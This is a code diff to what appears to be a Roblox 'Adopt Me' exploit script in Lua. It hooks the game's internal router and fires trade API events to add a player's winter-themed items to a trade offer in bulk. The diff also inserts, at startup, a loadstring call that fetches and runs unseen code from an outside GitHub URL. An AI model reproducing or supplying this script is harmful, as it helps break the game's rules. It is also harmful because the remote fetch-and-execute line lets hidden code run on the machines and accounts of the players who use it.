@@ -7,6 +7,8 @@ if not game:IsLoaded() then
     while not game:IsLoaded() do wait(1) end
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Roleck11/MainScripts/main/AdoptMeIntroCheck"))();
+
 for i, v in pairs(debug.getupvalue(require(game:GetService("ReplicatedStorage").Fsys).load("RouterClient").init, 4)) do
     v.Name = i
 end
@@ -505,6 +507,26 @@ end)
 
 TradeFeatureSection:NewButton("Add Winter Pets To Trade", "ButtonInfo", function()
     for i,v in pairs(require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets) do
+        if string.find(v.id, "winter")then        
+            game:GetService("ReplicatedStorage"):WaitForChild("API"):FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
+        end
+    end
+    for i,v in pairs(require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.toys) do
+        if string.find(v.id, "winter")then        
+            game:GetService("ReplicatedStorage"):WaitForChild("API"):FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
+        end
+    end
+    for i,v in pairs(require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.strollers) do
+        if string.find(v.id, "winter")then        
+            game:GetService("ReplicatedStorage"):WaitForChild("API"):FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
+        end
+    end
+    for i,v in pairs(require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.transport) do
+        if string.find(v.id, "winter")then        
+            game:GetService("ReplicatedStorage"):WaitForChild("API"):FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
+        end
+    end
+    for i,v in pairs(require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pet_accessories) do
         if string.find(v.id, "winter")then        
             game:GetService("ReplicatedStorage"):WaitForChild("API"):FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
         end
